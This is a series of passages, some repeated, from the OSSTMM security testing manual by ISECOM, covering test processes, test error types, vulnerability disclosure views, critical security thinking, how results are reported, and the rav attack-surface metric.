control is essential for any Analyst. An operational security test therefore requires thorough understanding of the testing process, choosing the correct type of test, recognizing the test channels and vectors, defining the scope according to the correct index, and applying the methodology properly. Strangely, nowhere, besides in security testing is the echo process considered the defacto test. Like yelling into a cavernous area and awaiting the response, the echo process requires interacting and then monitoring emanations from the target for indicators of a particular state such as secure or insecure, vulnerable or protected, on or off, and left or right. The echo process is of a cause and effect type of verification. The Analyst makes the cause and analyzes the effect on the target. It is strange that this is the primary means of testing something",

It is strange that this is the primary means of testing something as critical as security because although it makes for a very fast test, it is also highly prone to errors, some of which may be devastating to the target. Consider that in a security test using the echo process, a target that does not respond is considered secure. Following that logic, a Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 41\\ntarget needs only to be non-responsive to a particular type of request to give the appearance of security however still be fully interactive with other types of requests which shows there has been no separation. If hospitals used the echo process to determine the health of an individual, it would rarely help people, but at least the waiting room time would be very short. Hospitals however, like most other scientific industries, apply the Four Point Process which includes a function of the echo process called the “interaction” as one of the four tests. The other three tests are: the “inquest” of reading emanations from the patient such as pulse, blood pressure, and brain waves; the “intervention” of changing and stressing operating conditions such as the patient’s homeostasis, behavior, routine, or comfort level; and the “induction” of examining the environment and how it may have affected the target such analyzing what the patient has interacted with, touched, eaten, drank, or breathed in. However, in security testing, the majority of tests are based on the echo process alone. There is so much information lost in such one- dimensional testing we should be thankful that the health care industry has evolved past just the “Does it hurt if I do this?” manner of diagnosis. The security test process in this methodology does not recommend the echo process alone for reliable results. While the echo process may be used for certain, particular tests where the error margin is small and the increased efficiency allows for time to be moved to other time-intensive techniques, it is not recommended for tests outside of a deterministic environment. The Analyst must choose carefully when and under what conditions to apply the echo process. While many testing processes exist, the Four Point Process for security testing is designed for optimum efficiency, accuracy, and thoroughness to assure test validity and minimize errors in uncontrolled and stochastic environments. It is optimized for real-world test scenarios outside of the lab. While it also uses agitation, it differs from the echo process in that it allows for determining more than one cause per effect and more than one effect per cause.

These are things that an experienced testing group already does. Don’t confuse the formality in the dissection of the process with the formality of the reporting. You don’t have to show every step being done but you should understand how you got from A to C. It is like giving people driving directions. You tell them the steps on where they turn and relative proximity to things that they will see to know they are going the right way but you don’t tell them every street they drive down and every traffic signal they must obey to get to the end. Well, the 4PP is the specific directions and the means and reporting are actually the relativistic ones. Interactions within the 4 Point Process 1. Induction: (Z) establishing principle truths about the target from environmental laws and facts. The Analyst determines factual principles regarding the target from the environment where the target resides. As the target will be influenced by its environment, its behavior will be determinable within this influence. Where the target is not influenced by its environment, there exists an anomaly to be understood. 2. Inquest: (C) investigating target emanations. The Analyst investigates the emanations from the target and any tracks or indicators of those emanations. A system or process will generally leave a signature of its existence through interactions with its environment. 3. Interaction: (A/B) like echo tests, standard and non-standard interactions with the target to trigger responses. The Analyst will inquire or agitate the target to trigger responses for analysis. 4. Intervention: (X/Y/Z) changing resource interactions with the target or between targets. The Analyst will intervene with the resources the target requires from its environment or from its interactions with other targets to understand the extremes under which it can continue operating adequately.

It is designed as a flowchart; however, unlike the standard flowchart, the flow, represented by the arrows, may go backward as well as forward. In this way, it is more integrated and while the beginning and the end are clear, the audit has greater flexibility. The Analyst creates a unique path through the methodology based on the target, the type of test, the time allotted for the audit, and the resources applied to the test. For an orchestra, the composer writes the sheet music to designate the order and duration of notes, but only the conductor can control the execution of the performance. This methodology is like the sheet music, designating the necessary tests, but the Analyst controls the order, the duration, as well as the execution. The main",

    "text": "composer writes the sheet music to designate the order and duration of notes, but only the conductor can control the execution of the performance. This methodology is like the sheet music, designating the necessary tests, but the Analyst controls the order, the duration, as well as the execution. The main reason for requiring this level of flexibility in the OSSTMM is because no methodology can accurately presume the justifications for the operations of channel gateways in a target and their adequate level of security. More directly, this methodology cannot presume a best practice for conducting all audits, as best practice is based on a specific configuration of operations. Best practice is only best for some; generally the originator of the practice. Operations dictate how services should be offered, and those services dictate the requirements for operational security. Therefore, a methodology that is invoked differently for each audit and by each Analyst can still have the same end result if the Analyst completes the methodology. For this reason one of the foundations of the OSSTMM is to record precisely what was not tested. By comparing what was tested and the depth of the testing with other tests, it is possible to measure operational security (OpSec) based on the test results. Applying this methodology will therefore meet the Analyst’s goal to answer the following three questions which make up the Trifecta, the answer to OpSec needs. 1. How do current operations work? The derived metrics can be applied to determine the problem areas within the scope and which problems must be addressed. The metrics in this methodology are designed to map the problems in different ways so as to show if the problem is a general one or more specific, like an overlook or a mistake. 2. How do they work differently from how management thinks they work? Access to policies or a trust (or even a risk) assessment will map back to the different categories of the metrics. The categories provide the current state values where a comparison can be made with both an optimum state according to the policies and one according to assessed threats. 3. How do they need to work? Where the metrics show no gap between policy or trust (or risk) assessment’s optimum values yet the security test shows that there is indeed a protection problem regardless of controls as implemented in policy, it is possible to clearly denote a problem. Often, without even mapping to policy, a discrepancy between the implemented controls and the loss of protection is simply evident.

Since errors may not be the fault of the Analyst, the understanding of how and where errors can exist within a test is much more reasonable than expecting an Analyst to test without error. Furthermore, it is the Analyst who attempts what should not be possible that is most likely to encounter errors; therefore, denoting errors as a negative thing discounts the practice of thorough testing. Error Type Description Something determined as true is actually revealed false. The target response indicates a particular state as true although in reality 1 False Positive the state is not true. A false positive often occurs when the Analyst’s expectations or assumptions of what indicates a particular state do not hold to real-world conditions which are rarely black and white. Something determined as false is actually revealed as true. The target response indicates a particular state as not true although in reality the state is true. A false negative often occurs when the Analyst’s 2 False Negative expectations or assumptions about the target do not hold to real-world conditions, the tools are not adequate for the test, the tools are misused, or the Analyst lacks experience. A false negative can be dangerous as it is a misdiagnosis of a secure state when it does not exist. Something answers true to everything even if false.

The target response indicates a particular state as either true or false although in reality the state cannot be known. A specter often occurs when the Analyst receives a response from an external stimulus that is perceived to be from the target. A specter may be intentional, an 5 Specter anomaly from within the channel, or the result of carelessness or inexperience from the Analyst. One of the most common problems in the echo process is the assumption that the response is a result of the test. Cause and effect testing in the real world cannot achieve consistently reliable results since neither the cause nor the effect can be properly isolated. Something answers either true or false depending when it’s asked. The target response indicates a particular state as either true or false but only during a particular time, which may or may not follow a pattern. If the response cannot be verified at a time when the state changes, it may prevent the Analyst from comprehending the other state. An Analyst may 6 Indiscretion also determine that this is an anomaly or a problem with testing equipment, especially if the Analyst failed to calibrate the equipment prior to the test or perform appropriate logistics and controls. An indiscretion can be dangerous as it may lead to a false reporting of the state of security. The answer is lost or confused in signal noise. The target response cannot accurately indicate a particular state as either true or false due to a high noise to signal ratio. Akin to the idea of losing a flashlight beam in the sunlight, the Analyst cannot properly determine state 7 Entropy Error until the noise is reduced. This type of environmentally caused error rarely exists in a lab, however it is a normal occurrence in an uncontrolled environment. Entropy can be dangerous, if its effects cannot be countered. The answer changes depending on how and where the question is asked.

The target is a biased sample of a larger system or a larger number of possible states. This error normally occurs when an authority influences the 9 Sampling Error operational state of the target for the duration of the test. This may be through specific time constraints on the test or a bias of testing only components designated as “important” within a system. This type of error will cause a misrepresentation of the overall operational security. The answer changes depending on the limitations of the tools used. The limitations of human senses or equipment capabilities indicate a 10 Constraint particular state as either true or false although the actual state is unknown. This error is not caused by poor judgment or wrong equipment choices rather it is a failure to recognize imposed constraints or limitations. The answer is presumed to be of one state or the other although no test was made. The Analyst does not make a particular test or has a bias to ignore a particular result due to a presumed outcome. This is often a blinding from experience or a confirmation bias. The test may be repeated many times or the tools and equipment may be modified to have the desired 11 Propagation outcome. As the name implies, a process that receives no feedback where the errors remain unknown or ignored will propagate further errors as the testing continues. Propagation errors may be dangerous because the errors propagated from early in testing may not be visible during an analysis of conclusions. Furthermore, a study of the entire test process is required to discover propagation errors. The answer changes depending on the skill of the Analyst. An error caused by lack of ability, experience, or comprehension is not one of bias and is always a factor that is present, regardless of methodology or technique. While an experienced Analyst may make propagation errors, 12 Human Error one without experience is more likely to not recognize human error, something that experience teaches to recognize and compensate for. Statistically, there is an indirect relationship between experience and human error. The less experience an Analyst has, the greater the amount of human error an audit may contain.

A simple self-assessment can create a margin of operation errors caused during the test which the Analyst can use to either frame the thoroughness of the current audit or other audits of similar systems. Since it is a self assessment it will have a tendency to be biased. The Analyst should take great care for it to be as factual as possible as a form of quality assurance of the test and the test process. Although some may try to dismiss test errors which were on the fault of the Analyst, keeping track of all errors can only improve future tests and is not something to hide. Errors will happen and are no more than the Analyst’s attempt to interact with an ever-changing system. Regardless of the number and severity of errors, the tracking of test errors will serve as a record of the difficulty and complexity of the audit and the competency of the Analyst to deduce the errors. A record of test errors from the scope will also help sum up the environment in a simplistic way. It is a straight-forward reduction of the Executive Summary which often describes the Analyst’s opinion about the state of security wherein few to no errors will show a fairly static target and environment. Many errors show a chaotic environment and one that may lack controls for managing change or loss. Overall, test error records are useful for understanding the complexity of the audit and change control between audits of regular intervals.

Recommended solutions may be provided as a value-add to a security test but are not considered mandatory. Often there are no proper solutions based on the limited view an Analyst has of the client environment. Therefore, solutions are not required as part of an OSSTMM audit. Frequently, a test will exceed the limits of a security control. Within an engagement, the Analyst must always report the factual current state of security, any limitations within that current state, and any of the processes which caused those limitations of the applied controls and protections. To measure both the thoroughness of the test and the security of the target, use of this methodology should conclude with the Security Test Audit Report (STAR), available within this manual or at the ISECOM website. STAR requires the following information: 1. Date and time of test 2. Duration of test 3. Names of responsible Analysts 4. Test type 5. Scope of test 6. Index (method of target enumeration) 7.

What an Analyst does with these is first and foremost a result of the legal regulations of the Analyst’s region and the region where the work is being performed. Disclosure Rights What you do have to do is make sure that your access to and use of the product or solution did not require any sort of provisions, Non-Disclosure contract, or End User License Agreement (EULA) that denies you the right to claim, announce, or distribute any vulnerabilities discovered. If it did and you or the client accepted this contract then you can’t disclose to anyone, perhaps even the manufacturer, without potential legal repercussions. Furthermore if you work for the company making that product or are a legal client of theirs then you may not be able to legally disclose anything either. Furthermore, your rights in any case may be challenged according to the process of law in your region rather than existing legal precedent. Responsibilities However, if those cases do not apply then you effectively own that vulnerability and the sooner you make it public the more rights you have as the owner. In many countries, processes and information can be protected by law and often the legal process requires publication or legally filing such with attribution. If your disclosure can do no PHYSICAL harm (like yelling fire in a crowded movie theater), it is yours to make and no legal posturing need shake you when you’re right. However, to be safest, you should also promote, with the disclosed vulnerability, the controls which one can apply to fix the problem. For example, if it’s a problem with how one authenticates with a solution then suggest an alternative authentication scheme and how it can be successfully integrated. You do not need to wait for the manufacturer to release a fix or a recall to let people fix the problem. However, should you choose to work within the context of notifying the manufacturer, you will need to give them ample time to address the problem before making it public. There is a valid argument that the vulnerability may already be known in criminal circles and need immediate attention. Therefore should you",

Therefore should you choose to publish without the manufacturer’s assistance, do note that including a fix will also show legally that you had good intentions and much of the legal system focuses on implied intent. Your choice depends on whether frivolous lawsuits are accepted or prevalent in your region. Remember, it is not you the Analyst who is required to do the quality assurance testing for the manufacturer therefore you do not owe them any information from work you’ve done even if it includes their product. Full disclosure is helpful as long as it can do no human, physical harm. Furthermore, consumers should not have to wait on manufacturer fixes for their products to be secure. If the product is not sold as a security specific solution then it’s up to the consumers to make it secure and safe, or not use it. If it is sold as secure and safe then it is up to the manufacturer to fix it however, the consumer may not want to wait until the manufacturer can do so. Full disclosure allows for this choice.

This requires understanding more than just the information but also where it came from, how and when it was collected, and any constraints of the collection process. The final part of the analysis process is to create actionable intelligence, information derived from fact that can be used to make decisions. This is the clear distinction between security and risk analysis. In security analysis, you produce facts even if that fact states something can’t be known from the information provided. In risk analysis, you speculate and derive opinions based on information. Risk analysis can use security analysis to come up with better, more accurate answers however security analysis cannot use risk analysis to improve accuracy. For this reason we recommend trust analysis. Analyzing the Security of Everything The fundamental difference between doing a risk analysis versus a security analysis is that in security analysis you never analyze the threat. This is because assuming you know what threats exist, when they may hit, how they will come, and where they will go is something reserved for risk analysis. In security analysis, you study and measure the attack surface of and around a target. This will allow you then to understand where the threats, any threats, can attack if they do attack. For example, consider a long, high wall. The risk analysis will consider",

A security analysis will also allow you to assure the right controls exist, work the way they should, and properly cover the interactive points of the various accessible vectors and channels.

That idea may be an answer, a conclusion, or a characterization of something or someone so that verification tests can be well defined. As an answer or a conclusion, critical security thinking will provide that which makes the most sense. As a characterization, it will show you what you need to verify, according to what you need to verify, according to what vector, how, and what the targets will be. It will also help you respect different opinions or viewpoints beyond security itself to the interconnectedness security makes with people, places, processes, and money. It will help you address contradictory conclusions and explore alternate consequences. So even if the critical security thinking model can’t provide an answer it should tell you what facts are still missing and from where you need to get them. The process of critical security thinking is dependent on the Analyst being able to discern true statements or at least recognize the degree of possible falsity or dynamic properties in a statement. One way to do this is to recognize the amount of trust you can have in a fact through the use of trust metrics. Another way is to be able to deconstruct a statement, separating out fallacious arguments. In practice, an Analyst will need to do both. The Analyst will need to have a good understanding of what is being analyzed and a good understanding of logical fallacies used to make qualifiers, statements based on fallacious concepts usually in the form of axioms or best practices. The Six Step Analysis Technique Unfortunately, the world is not prescriptive. Not every question has a right answer. The correctness of an answer is dependent on many things including, most importantly, how it is asked. This is a problem affecting all industries but none so obviously as security which is why critical security thinking is so important. As a technique for analysis it can be reduced to 6 simple steps to ascertain factual results with a high trust level for correctness even when solutions are not linear",

As a technique for analysis it can be reduced to 6 simple steps to ascertain factual results with a high trust level for correctness even when solutions are not linear like when there is no connection from point A to point B. Therefore the ability to validate sources and measure trust is crucial for making proper, actionable intelligence out of tests. In these steps, “target” refers to whatever you are analyzing in preparation of a test, be it people, computers, buildings, or processes. 1. Build your knowledge of the target from a variety of the most contemporary, factual resources while avoiding commercially biased and speculative information. 2. Determine the global level of experience for the type of target and the amount of information possibly known about it. 3. Determine any bias or ulterior motives in the information sources. 4. Translate jargon from information sources to similar or known words for comparison because what may sound new or complicated may just be a trick to differentiate something common. 5. Be sure the test equipment has been properly calibrated and the test environment verified to assure the results are not contaminated by the test itself. 6. Assure that the translation state of tools or test processes has been removed as much as possible so that the results do not come from the indirect sources in a process or the pre-analysis from some tools. What’s most important to understand here is when making a characterization don’t worry about being right. It’s more important to be right about being wrong or right which means the right tests were made to verify the characterization. Then if the characterization is wrong we at least know for sure it is wrong and can re-characterize. That’s how the scientific method works. It’s not about believing or relying on your experience, no matter how vast, but on knowing facts we can build upon.

Understanding our own limitations as humans and how we think influences how security can be perceived and defined. This leads many security professionals to provide qualifiers for what they don’t understand or can’t deliver. Most often though they are just repeated as axioms without further thought, eventually accepted as truths of security. This further hurts our ability to provide proper security because our analysis is perverted by catch phrases and best practices that may have no basis in fact now or ever. For example, some common axioms still in use will seem much less like golden rules and more like excuses when put to the light of critical security thing. These axioms are so common because there is a general inability to think critically about security or separate",

    "text": "fact now or ever. For example, some common axioms still in use will seem much less like golden rules and more like excuses when put to the light of critical security thing. These axioms are so common because there is a general inability to think critically about security or separate it from risk as a concept. Security is not about risk. It is about protection and controls. Risk is about risk. Risk is speculated, contrived, derived, and correlated. Risk is also subjective. Security should not be. To better understand how these qualifiers taint our ability to make good security analysis, we can examine the fallacies in the common qualifiers: 1. There is no such thing as 100% secure. The statement fails to provide conditions such as time and the metric for which percentages can be used as the scale. As a risk statement, it could hold true- “There is no such thing as always being 100% risk free.” because under the definition of risk, even our own bodies are subject to time and self-inflicted injuries. However as a security statement it can have far too many exceptions to be true. 2. Even if you are secure, if an attacker wants in badly enough they’ll get in. The statement fails to provide the condition of time, which for any human attacker would be finite, and includes a form of the equivocation fallacy which qualifies the attacker’s desire. Therefore, if no attacker has entered then they apparently didn’t want in “badly enough”. Furthermore, the statement makes a use of the phrase “get in” too broadly so that the idea is gaining entry but could be further applied to any number of potential, harmful attacks. 3. There is no perfect security. The statement fails to provide the condition of time implying the axiom means “ever” which is itself an absolute and difficult to prove. This short statement also falls into the categories of two logical fallacies, the Nirvana fallacy and the Perfect Solution fallacy. In the Nirvana fallacy, we are mislead to reject something because it cannot be perfect. However, it can be good enough for one’s needs. In the Perfect Solution fallacy, the argument assumes a perfect solution even exists. This assumption is easy to argue in terms of products for those who only understand security concepts in terms of products. In reality, “perfect” is a subjective concept and what may not be perfect for one person may indeed be perfect for another. Within the context of this manual, “perfect” means a perfectly balanced equation when calculating the attack surface consisting of OpSec and Limitations against Controls.

While this statement is meant to inform those who think of security in terms of products, this catchphrase actually uses the fallacies of False Dilemma and Presumption to persuade. As a False Dilemma, it states that there are only two choices, a product and a process and therefore security must be one or the other. As a Presumption, the conclusion of the statement is already presumed as a process being the means to security. Together, these fallacies do not allow for products and processes to combine in the formation of security nor does it allow for something else entirely different. In reality, the public definition of security is ill defined and not actually achievable, which is the likely reason for all these axioms in the first place. This leaves room for many interpretations of what security can be and the main reason why the Analyst must commit to an achievable, measurable definition of security. To state then that security is one thing or another is false especially when security itself is undefined and lends itself to standard, dictionary interpretations. It is also why this manual clearly defines security as something measurable. An Analyst is required to apply critical security thinking skills to information as it is provided as well as to statements which are made about the analyzed information to form factual intelligence. Intelligence created in such a manner will provide accurate and unbiased metrics as well as a clear understanding of how security is deficient without the need for qualifiers. 3.2 Recognize the OpSec Model There are two problems with security analysis in practical use on operations. The first is that technology is often far ahead of every Analyst’s ability to understand how all of it works, if this know-how is even possible to obtain under the current closed-box status of most commercial technology products. The second problem is that ironically, the deconstruction of how something works, including business processes, may be illegal in order to protect the financial risk and privacy of the manufacturer from the buyer even though as a user of the product, the buyer may actually need that information to protect themselves from real threats which are probably not their customers. However, even in cases where a technology or process cannot be analyzed directly, the product can be analyzed within the environment with which it interacts. For each vector and channel that is analyzed, the Analyst will be putting an overlay of the OpSec model over the targets. To apply the OpSec model is simply to count the controls for each interactive point of Access or Trust as well as the discovery of opportunity in the form of Visibility. Where a target is an unknown like a black box which can’t be opened, the Analyst needs to address the controls over the system’s interactions in its environment. The process will look like this: 1. What is visible in the scope? What is of possible value that is known? What targets can be determined? 2.",

Even a quick application of the OpSec model will tell you if an Access or a Trust is balanced with controls. This will tell you the size of the attack surface and which interactive points are open without any controls to govern them.

This is adequate when looking for matching socks but not so good when looking at the big picture of an attack surface. It is the major problem known as pattern matching, the human trait to skip over steps, sometimes unknowingly, which are considered unnecessary due to an “obvious” outcome. It also makes people see cause and effect where there may be none. It is a blind spot which Analysts will develop after years of doing initial, basic, or redundant tasks. These tasks are made more efficient through short-cuts which affect the quality of the verification tests and ultimately the analysis. For actionable intelligence, a result is only as good as the methods used to get them. Not knowing how you got a particular result will severely limit the action you can take to fix it. When an Analyst uses pattern matching to skip steps, the method cannot be properly known. Still, the desire to “cut to the chase” to get to the meat of a problem while presuming a state which is actually unknown is a problem in many areas of science. Security is no exception. Therefore an Analyst must recognize when tests have been skipped or the data fudged to provide unverified results. To detect pattern matching, examine the test methods and result data for the following: 1. Tests using specific threats instead of a thorough interaction with the attack surface. 2.

Tests of targets which have obviously not been secured. 3.4 Characterize the Results The scientific method is not a checklist. It is a process which allows for intelligence and imagination. A hypothesis is made and then data is collected through testing and observation to evaluate that hypothesis. In a security test, a hypothesis is essentially made whenever a verification is made against a direct or indirect interactive point in the scope. The Analyst has the empirical data from those tests and must consider if the tests actually verified the hypothesis. Were the right tests made? Were enough tests made? Were the right channels or vectors tested? Were new interactions created that were also then tested? To do this, we characterize the results. To characterize a security test using the scientific method is to discover the properties of the scope to assure the correct tests were made for it. The tester makes a hypothesis as to the interactivity of a point in the attack surface. The test will return that the point is interactive and adds to the attack surface or not interactive and whether it still adds to the attack surface, controls in place, any limitations in those controls, any limitations in the defined security, and any anomalies. At this point the Analyst may be wrong about the function of the process in operation however the Analyst may not be wrong in which tests should be used to verify what the function actually is. This is why both knowledge of the process and creatively imagining the indirect interaction are necessary. For example, the Analyst may characterize a process as including the interaction between a visitor and the network via the access card. So while this visitor does not have the credentials to access the network, because the card reader is tied into the computer system, that visitor does access the network by swiping the card. The Analyst must consider how to test what happens when the visitor interacts with the card reader to gain access as well as the side effects of having the card read. However, even if the tests show that the card reader is connected to a stand-alone computer system and is not attached to the network, Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 57\\nthe Analyst has properly verified that the right tests were made against the right targets to get that answer. Therefore, the Analyst will examine the scope for where an interaction might occur as well as where operations show interactions do occur. This will allow a characterization of the points of interaction, any possible indirect interactions, and all side effects from such interactions. This characterization must be then matched with the tests made to determine if all the correct tests were made. 3.5 Look for Signs of Intuition One thing that machines are clearly better",

This characterization must be then matched with the tests made to determine if all the correct tests were made. 3.5 Look for Signs of Intuition One thing that machines are clearly better than humans at is consistency. Humans generally get bored, confused, or careless. When a machine counts coins, it doesn’t lose count and need to start over. It doesn’t doubt itself and start over. It also won’t use intuition. Also called “gut instinct” the power of intuition is incredible. It allows people to imagine, apply creativity to a job, and know when something feels wrong. It’s part of the human condition to subconsciously detect problems and prepare accordingly. However it’s exactly this that sometimes leads us to make mistakes. This is never more obvious than when we count large amounts of similar-looking objects. Without total concentration, we may begin to feel uneasy about the tally and eventually we may feel compelled to either start over or just accept a particular correct-sounding number where we think we left off and continue from there. There is a time when a test requires precise concentration; during a large number of repetitive sequences. Generally, we tend to create tools to handle this type of repetition however it may not always be possible due to the dynamic nature of the test like when interacting with people instead of inanimate objects or machines. So as the test progresses, the tester may use intuition to make the presumption that the test will be unnecessary. The Analyst must pay special attention to these tests and look for signs of intuition in part of the tester. Signs of trouble from intuition in tests are: 1. Inconsistencies of types of tests performed across multiple, similar targets. 2. The number of tests decrease between targets. 3. The length of time for tests decrease between targets. 4. The same target tested more than once with the same tests. Detection of intuition in tests will show an inadequate testing process and the quality of the results should be regarded with suspicion. Re-testing may be necessary.

Since the tests will depend on the OpSec and controls of a particular channel and vector there will be unknowns. There may be a visible target which provides no interaction and no further information about that target can be determined from this vector and this channel. This is correct. The Analyst should report what has been found with certainty and not merely what could be. There is no place for guessing when measuring an attack surface. In addition to information about the test itself as to how it was made, the Analyst will need to report the following 7 test results: 1. Unknowns As more vectors and channels are analyzed, more information will be available and that which",

In addition to information about the test itself as to how it was made, the Analyst will need to report the following 7 test results: 1. Unknowns As more vectors and channels are analyzed, more information will be available and that which is reported will change and provide actionable intelligence. Conversely, maybe more results are inconclusive or the correlation of results provide conflicting answers, the resulting actionable intelligence is unknown. Unknown is a valid answer to report. What cannot be known is as valid and as important in security as what is discovered. What is unknown shows what is difficult to test or analyze. The unknown need not be seen as a failure of the tester rather it may be caused by superior protection or an attack that uses a large cost of time or resources not possible in a test. No Analyst should fear reporting something is unknown. It is a powerful result to base further risk analysis upon. 2. Untested Targets Additionally, the Analyst needs to report another type of unknown - targets in the scope which have not been tested in a particular vector or channel. If a test cannot be completed because of time constraints, tool limitations, targets being unstable, the test environment being too dynamic or too noisy to collect proper results, or because the tests were not wanted by the target owner then this needs to be known. By reporting what was not tested, it is possible to do proper test comparisons with future tests. It will also help avoid cheating by only testing the well protected segment of a scope and ignoring the rest to create the illusion of a small attack surface. 3. Identified and Verified Limitations Besides unknowns, the Analyst must also report any identified and verified limitations such as vulnerabilities in the targets. An identified limitation is one which has been determined through knowledge and correlation. This is useful when the tests themselves are dangerous or very costly. Sometimes a test can be damaging to a target or cause unacceptable or even criminal collateral damage. A verified limitation is one where the problem has been specifically tested to determine if it exists. 4. False Positives and the Means to Generate Them During tests, some identified limitations will not be vulnerable to those particular attacks during verification. This, however does not conclude that the target does not have those limitations. It only means that particular test at that particular time and from that particular tester did not expose the vulnerability as identified. It could also mean the target is vulnerable but is protected by a particular control. Such determined false positives should be reported so that during further development of protective and defensive techniques, the problem can be looked at more closely, particularly from a different vector.

Failed Security Processes and Procedures During analysis, test results will show more than just the OpSec, types of controls, and number of limitations. It will show a bigger picture, one of processes and procedures that are in use to formalize protective measures. These can be about anything that are designed to get the protection measures to their current state. This includes but is not limited to maintenance, procurement, identification, authorization, housekeeping, disaster recovery, partner relations, policy generation, climate control, and human resources. When a target has a limitation often times there is a failed process or procedure behind it. The Analyst should be able to determine exactly what it is from the aggregate test results. 6. Good Practices The term “Best Practices” is used to explain the best way for a person or organization to do something. Unfortunately, this has been abused to the point where it now means that it’s best for everyone. This itself has caused problems and wasted resources. One way to counter this problem is to use the aggregate test results to show practices which are successful. This will show what can be repeated for equivalent success in other areas of the organization and defining a customized “Best Practice” for them. It will also lessen their reliance on industry-wide Best Practices in favor of what works best for them. 7. Compliance Should specific compliance objectives need to be reached, the Analyst needs to use the correlated test results to determine if these objectives have been met. This may need to be provided in a special format as determined by the auditor however the Analyst is best equipped to show which test results provide the necessary information.

It works for defining strategy. Security testing however is verifying to what completeness that security or those controls exist. It works for defining operations. To test you don’t make a risk assessment because doing so would restrict your potential and your findings. After all, you shouldn’t be making the same guesses they are.

When we measure the height, width, or length of an object we are using an operational metric. When we write the date, have a birthday, or ask the score of a game we are using operational metrics. An operational metric is a constant measurement that informs us of a factual count in relation to the physical world we live in.

They are operational because they are numbers we can work with consistently from day to day and person to person. It is difficult to work with relative or inconsistent measurements like choosing a specific hue of yellow to paint a room, starting work at sunrise, having the right flavor of strawberry for a milkshake, or preparing for the next threat to affect your organization’s profits because the factors have many variables which are biased or frequently changing between people, regions, customs, and locations. For this reason, many professions attempt to standardize such things like flavors, colors, and work hours. This is done through reductionism, a process of finding the elements of such things and building them up from there by quantifying those elements. This way, colors become frequencies, work hours become hours and minutes, flavors become chemical compounds, and an attack surface becomes porosity, controls, and limitations. The only real problem with operational metrics is the requirement for knowing how to properly apply the metric for it to be useful. Using ravs to measure and track the security of anything over time. The completion of a thorough security test has the advantage of providing accurate metrics on the state of security. As with the use of any metric. the less thorough the test, the less accurate the overall metric. Less skilled or less experienced Analysts will also adversely affect the quality of the metric just as people who can’t tell time can’t build clocks, designers without the right tools can’t match colors exactly, and Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 62\\nbrew masters who can’t measure the ingredients in beer can’t make similar batches repeatedly for market. Therefore a successful security metric requires a test which can be described as measuring the appropriate vectors while accounting for inaccuracies and misrepresentations in the collected test data as well as the skills or experience of the security professionals performing the test. Faults in these requirements result in lower quality measurements and false security determinations therefore the metric must also be simple enough to use without making it so simple that it tells nothing. Furthermore, a proper security metric must avoid the biases inherent in risk assessments by assuring measurements have integrity. These qualities have been combined to create the ravs, an unbiased, factual description of an attack surface. 4.1 Getting to Know the Rav The rav is a scale measurement of the attack surface, the amount of uncontrolled interactions with a target, which is calculated by the quantitative balance between operations, limitations, and controls. Having the ravs is to understand how much of the attack surface is exposed. In this scale, 100 rav (also shown as 100% rav for simplicity of understanding although not precisely a percentage) is perfect balance and anything less is too few controls and therefore a greater attack surface.

In this scale, 100 rav (also shown as 100% rav for simplicity of understanding although not precisely a percentage) is perfect balance and anything less is too few controls and therefore a greater attack surface. More than 100 rav shows more controls than are necessary which itself may be a problem as controls often add interactions within a scope as well as complexity and maintenance issues. The rav does not measure risk for an attack surface, rather it enables the measurement of it. It cannot say if a particular target will be attacked however it can say where on a target it will be attacked, what types of attacks the target can successfully defend against, how deep an attacker can get, and how much damage can be done. With that information it is then possible to assess the trusts (and risks) much more accurately. The rav is actually multiple separate calculations of Porosity, Controls, and Limitations, that when combined will show the size of an attack surface in two practical ways. The first way is in a straight calculation. It is the calculation of the Delta, a number that describes the specific exposure of that target. This is useful for determining how a new person, thing, or process will change the operational security of a new scope or as a comparison between multiple, single targets. This is also the easiest way to see Perfect Security, the perfect balance between Porosity, Controls, and Limitations. The rav is displayed as a positive or negative number which shows how far away the target is from a perfect security balance. A positive delta shows too much is spent on controls in general or even if the overspending is on too much of one type of control. A negative delta shows a lack of controls or controls themselves with limitations which cannot protect the target adequately. This is a powerful tool for knowing exactly where and how resources are being spent to protect a particular target. However this is not how the rav is most useful; that is done best the second way. The second practical way to display the attack surface is for understanding the big picture. This is represented as Actual Security. Where the Delta calculation is based on perfect balance, the Actual Security calculation uses the Delta but also includes additional and redundant controls to provide a metric more people friendly and familiar. Here the rav representation is similar to how people use percentages. The rav is calculated with a base 10 logarithm, which makes a more comprehensible representation. While the rav is still a balance, perfect balance is set at 100 and calculations are made in respect to that. This will allow most people to have a quick and easy overview of all the targets in a scope or of just a single target in relation to other targets. It is extremely flexible so multiple attack surfaces can",

All three will provide the same information to a person that the protection of the target is 5% deficient and therefore exposed to attack. With this knowledge, one can begin to assess risk and determine what is exposed, what is left uncontrolled, and if that 5% is acceptable. So for whatever threat there is, it can only occur where the openings are and that will sharpen the exactness of a risk analysis from broad sword to scalpel.

A rav is a little different from other security measurements because the count is unique from the scope. That is like determining the overall size of a person by counting all the cells in them and categorizing them by what they do to determine the person’s overall health. For a rav, both the count and the operation are required. This is why the rav can only be derived from operational security testing. Imagine a machine exists that can audit all the cells in a human body. This machine works by monitoring the cells in their environment and even prodding each cell in a way it can react to better categorize its purpose. We could then see what various cells do and how they contribute to the overall make-up of the human body. Some cells make up tissue walls like skin cells do. Some, like white blood cells, provide authentication and attack other cells which are on its “bad” list. Then some cells are foreigners, like bacteria which have entered at some point and thrived. The machine would classify all the cells that make up the person, a defined scope, rather than say which are “bad” or “good”. By counting the cells the machine can tell mostly how well the person as an organism works (health) and how well they fit into their current environment. It can also determine which cells are broken, which are superfluous, and of which type more might be required for the person to be more efficient, prepared for the unexpected, or for any number of specific requirements. Since the cells are dividing and dying all the time, the machine must also make regular tests and chart the person’s ability to improve or at least maintain homeostasis. Now in addition to counting cells and seeing how they work, the machine will also see with which other cells or under what conditions they",

